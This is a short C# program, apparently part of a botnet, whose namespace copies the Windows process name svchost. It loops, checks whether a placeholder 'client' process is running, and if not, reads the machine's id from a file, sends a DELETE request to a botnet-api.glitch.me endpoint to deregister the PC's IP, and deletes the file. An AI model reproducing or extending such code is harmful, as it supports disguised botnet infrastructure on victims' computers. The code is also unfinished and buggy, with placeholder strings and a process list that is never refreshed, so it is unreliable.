using System.Linq;
using System.Diagnostics;
using System.IO;
using System;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;

namespace svchost.exe
{
    class Program
    {
        static async Task Delete(uint id)
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("https://botnet-api.glitch.me/");
            await client.DeleteAsync($"/api/v1/ip/{id}");
        }
        static void Main(string[] args)
        {
            string id;
            var processes = Process.GetProcesses();
            string[] proc = new string[processes.Length];
            for (int i = 0; i < processes.Length; i++)
            {
                proc[i] = processes[i].ToString();
            }
            while (true)
            {
                if (proc.Contains("System.Diagnostics.Process (имя клиента)"))
                {
                    continue;
                }
                else
                {
                    id = File.ReadAllText("путь к файлу .txt с id ip текущего pc");
                    Delete(Convert.ToUInt32(id)).Wait();
                    File.Delete("путь к файлу .txt с id ip текущего pc");
                }
            }
        }
    }
}
